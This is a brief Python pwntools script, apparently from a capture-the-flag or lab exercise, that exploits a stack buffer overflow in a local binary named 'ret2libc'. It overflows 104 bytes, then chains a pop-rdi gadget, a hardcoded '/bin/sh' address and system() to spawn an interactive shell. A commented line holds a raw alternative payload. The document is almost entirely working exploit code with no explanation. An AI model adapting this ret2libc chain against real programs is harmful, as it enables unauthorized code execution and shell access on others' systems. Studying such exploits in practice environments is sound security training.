from pwn import *
from struct import *
p = process("./ret2libc")
e = ELF("./ret2libc")

for symbol in e.symbols:
	print symbol, hex(e.symbols[symbol])

buff = "A"*(96+8)
pop_rdi = int("0x4006a3", 16)
#pop_rdi = int("0x42424242",16)
binsh_addr = int("0x7ffff7b99d57", 16)
system_addr = int("0x7ffff7a52390", 16)

payload = buff+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)

#f = open("in2.txt", "w")
#f.write(payload)
p.sendline(payload)
p.interactive()
#r <<< $(python -c "print 'A'*104+'\x93\x06\x40'+'\x00'*5+'\x3f\x07\x40'+'\x00'*5+'\xb0\x04\x40'+'\x00'*5")
